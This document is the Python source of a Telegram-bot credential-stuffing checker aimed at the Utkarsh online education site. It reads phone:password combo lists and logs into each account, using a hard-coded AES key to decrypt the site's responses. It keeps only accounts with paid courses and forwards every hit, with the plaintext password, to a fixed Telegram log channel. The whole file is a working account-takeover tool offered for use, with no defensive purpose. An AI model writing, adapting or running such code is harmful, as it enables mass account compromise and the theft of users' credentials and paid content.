import requests
import json
import base64
import uuid
import os
import time
import threading
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
from concurrent.futures import ThreadPoolExecutor
from functools import partial

# --- CONFIG ---
MAX_THREADS = 10
LOG_CHANNEL = -1004441498543
print_lock = threading.Lock()

# AES Keys
KEY = b'%!$!%_$&!%F)&^!^'
IV = b'#*y*#2yJ*#$wJv*v'

REQUEST_TIMEOUT = 8
SLEEP_TIME = 0.3

# --- HELPERS ---
def decrypt_utkarsh(enc_data):
    try:
        if not enc_data or not isinstance(enc_data, str): 
            return None
        cleaned_data = enc_data.replace('MDE2MTA4NjQxMDI3NDUxNQ==', '==').replace(':', '==')
        raw_bytes = base64.b64decode(cleaned_data)
        cipher = AES.new(KEY, AES.MODE_CBC, IV)
        decrypted = unpad(cipher.decrypt(raw_bytes), AES.block_size)
        return json.loads(decrypted.decode('utf-8'))
    except:
        return None

def parse_combo(line):
    parts = line.strip().split(':')
    if len(parts) < 2: 
        return None, None
    p = parts[-1].strip()
    u = parts[-2].strip()
    if "/" in u:
        u = u.split("/")[-1]
    if not u or not p or "utkarsh.com" in u: 
        return None, None
    return u, p

def is_paid_course(course_item):
    price_fields = ['mrp', 'price', 'amount', 'original_price', 'course_price']
    
    for field in price_fields:
        if field in course_item:
            val = course_item[field]
            if val is None or val == '' or str(val).lower() in ['0', '0.0', '0.00', 'free', 'null', 'none']:
                return False
            try:
                if float(val) > 0:
                    return True
            except:
                pass
    
    if 'is_paid' in course_item:
        return bool(course_item['is_paid'])
    
    if 'plan_type' in course_item:
        return str(course_item['plan_type']).lower() in ['paid', 'premium', 'prime']
    
    if 'course_type' in course_item:
        return str(course_item['course_type']).lower() in ['paid', 'premium', 'prime']
    
    return False

def extract_courses_with_type(raw_data):
    paid = []
    free = []
    
    if not raw_data:
        return paid, free
    
    def get_course_info(item):
        if not isinstance(item, dict):
            return None, None
        
        name = None
        for field in ['title', 'course_name', 'batch_name', 'name', 'course_title', 'plan_name', 'display_name']:
            if field in item and isinstance(item[field], str) and item[field].strip():
                name = item[field].strip()
                if name.lower() not in ['null', 'none', 'undefined', '']:
                    break
        
        if not name:
            return None, None
        
        is_paid = is_paid_course(item)
        return name, is_paid
    
    def recurse(data):
        if isinstance(data, dict):
            name, is_paid = get_course_info(data)
            if name:
                if is_paid:
                    paid.append(name)
                else:
                    free.append(name)
            
            for key, value in data.items():
                if key in ['data', 'list', 'courses', 'batches', 'items'] or isinstance(value, (dict, list)):
                    recurse(value)
        
        elif isinstance(data, list):
            for item in data:
                recurse(item)
    
    recurse(raw_data)
    
    def unique_preserve_order(lst):
        seen = set()
        result = []
        for x in lst:
            if x not in seen:
                seen.add(x)
                result.append(x)
        return result
    
    return unique_preserve_order(paid), unique_preserve_order(free)

def fetch_all_courses(session, headers):
    paid_courses = []
    free_courses = []
    
    base_url = "https://online.utkarsh.com/web/Profile/my_course"
    
    cookie = headers.get('cookie', '')
    csrf = ""
    if 'csrf_name=' in cookie:
        csrf = cookie.split('csrf_name=')[1].split(';')[0].strip()
    
    for course_type in ["Batch", "Free", "Prime"]:
        try:
            payload = {"type": course_type, "csrf_name": csrf, "sort": "0"}
            res = session.post(base_url, headers=headers, data=payload, timeout=REQUEST_TIMEOUT)
            if res.status_code == 200:
                res_json = res.json()
                if "response" in res_json:
                    res_json = decrypt_utkarsh(res_json["response"]) or res_json
                
                p, f = extract_courses_with_type(res_json)
                
                for course in p:
                    if course not in paid_courses:
                        paid_courses.append(course)
                for course in f:
                    if course not in free_courses:
                        free_courses.append(course)
        except:
            pass
        
        time.sleep(SLEEP_TIME)
    
    return paid_courses, free_courses

# --- BOT LOGIC ---
def check_account(line, bot, chat_id, hits_list, state, total_lines):
    mobile, password = parse_combo(line)
    if not mobile:
        with print_lock:
            state['checked'] += 1
            update_progress(bot, chat_id, state['msg_id'], state['hits'], state['checked'], total_lines)
        return

    session = requests.Session()
    session_id = str(uuid.uuid4()).replace('-', '')
    
    headers = {
        'authority': 'online.utkarsh.com',
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://online.utkarsh.com',
        'referer': 'https://online.utkarsh.com/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
        'cookie': f'ci_session={session_id}'
    }

    try:
        # 1. CSRF Token
        t_res = session.get('https://online.utkarsh.com/web/home/get_states', headers=headers, timeout=REQUEST_TIMEOUT)
        token = t_res.json().get("token")
        
        if not token:
            with print_lock:
                state['checked'] += 1
                update_progress(bot, chat_id, state['msg_id'], state['hits'], state['checked'], total_lines)
            return
        
        headers['cookie'] = f'csrf_name={token}; ci_session={session_id}'
        time.sleep(SLEEP_TIME)

        # 2. Login
        payload = {
            "csrf_name": token, 
            "mobile": mobile, 
            "password": password,
            "submit": "LogIn", 
            "url": "0", 
            "device_token": "null"
        }
        
        res = session.post("https://online.utkarsh.com/web/Auth/login", data=payload, headers=headers, timeout=REQUEST_TIMEOUT)
        res_data = res.json().get("response", "")
        login_json = decrypt_utkarsh(res_data)

        if login_json and login_json.get("status") is True:
            name = login_json.get('data', {}).get('first_name', 'User')
            time.sleep(SLEEP_TIME)
            
            # 3. Fetch Courses
            paid, free = fetch_all_courses(session, headers)
            
            # 4. Filter Logic (Second Script se): Sirf PAID wale hits chahiye
            # "No Courses Found" aur "Free-only" accounts skip kar denge
            if not paid:
                with print_lock:
                    state['checked'] += 1
                    update_progress(bot, chat_id, state['msg_id'], state['hits'], state['checked'], total_lines)
                return
            
            with print_lock:
                state['hits'] += 1
                state['checked'] += 1
                
                # DETAILED FORMAT
                hit_text = "🎯 *APP NAME : UTKARSH*\n\n"
                hit_text += "🔑 *Your Login Credentials 🪪 :*\n"
                hit_text += f"🆔 *Mobile*Password :* `{mobile}*{password}`\n\n"
                hit_text += f"👤 *Name :* {name}\n"
                hit_text += f"📱 *Mobile :* `{mobile}`\n\n"
                
                # Paid Courses
                hit_text += f"💰 *Paid Batches ({len(paid)}):*\n"
                for batch in paid:
                    hit_text += f"📚 • {batch}\n"
                hit_text += "\n"
                
                # Free Courses (optional - agar dikhane ho)
                if free:
                    hit_text += f"🆓 *Free Batches ({len(free)}):*\n"
                    for batch in free[:5]:  # Sirf 5 dikhayenge
                        hit_text += f"📚 • {batch}\n"
                    if len(free) > 5:
                        hit_text += f"   +{len(free)-5} more...\n"
                
                hits_list.append(hit_text)
                update_progress(bot, chat_id, state['msg_id'], state['hits'], state['checked'], total_lines)
                
                # Log Channel with delay
                time.sleep(0.5)
                try:
                    bot.send_message(LOG_CHANNEL, hit_text, parse_mode="Markdown", disable_web_page_preview=True)
                except:
                    pass
        else:
            with print_lock:
                state['checked'] += 1
                update_progress(bot, chat_id, state['msg_id'], state['hits'], state['checked'], total_lines)

    except Exception as e:
        with print_lock:
            state['checked'] += 1
            update_progress(bot, chat_id, state['msg_id'], state['hits'], state['checked'], total_lines)
    
    finally:
        session.close()

def update_progress(bot, chat_id, msg_id, hits, checked, total):
    try:
        if total > 0:
            progress_percent = int((checked / total) * 10)
            bar = "■" * progress_percent + "▢" * (10 - progress_percent)
        else:
            bar = "■■▢▢▢▢▢"
        
        progress_text = f"""╭───☀ 𝖢𝖧𝖤𝖢𝖪𝖨𝖭𝖦 ☀───╮
┣ ⚙️ {bar} 
┣ 📊 Hit : {hits}
┣ 📂 Loaded : {checked}/{total}
┣ 🔥 Status : Checking...
╰─── 𝐔𝐭𝐤𝐚𝐫𝐬𝐡 𝐁𝐨𝐭 ───╯"""
        
        bot.edit_message_text(chat_id=chat_id, message_id=msg_id, text=progress_text)
    except:
        pass

def run_check(bot, chat_id, progress_msg_id, combo_file, platform_name):
    hits_list = []
    
    with open(combo_file, "r", encoding="utf-8", errors="ignore") as f:
        lines = [l.strip() for l in f.readlines() if l.strip()]

    total_lines = len(lines)
    state = {'hits': 0, 'checked': 0, 'msg_id': progress_msg_id}
    
    func = partial(check_account, bot=bot, chat_id=chat_id, hits_list=hits_list, state=state, total_lines=total_lines)
    
    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        executor.map(func, lines)

    # Final File
    final_filename = "utkarsh_hit.txt"
    if hits_list and state['hits'] > 0:
        with open(final_filename, "w", encoding="utf-8") as f:
            for hit in hits_list:
                f.write(hit)

        with open(final_filename, "rb") as f:
            bot.send_document(chat_id, f, caption=f"✅ {platform_name} Valid Hits ({state['hits']})")
        
        if os.path.exists(final_filename):
            os.remove(final_filename)
    else:
        bot.send_message(chat_id, "❌ No valid hits found.")

    try:
        bot.delete_message(chat_id, progress_msg_id)
    except:
        pass
        
    if os.path.exists(combo_file):
        os.remove(combo_file)
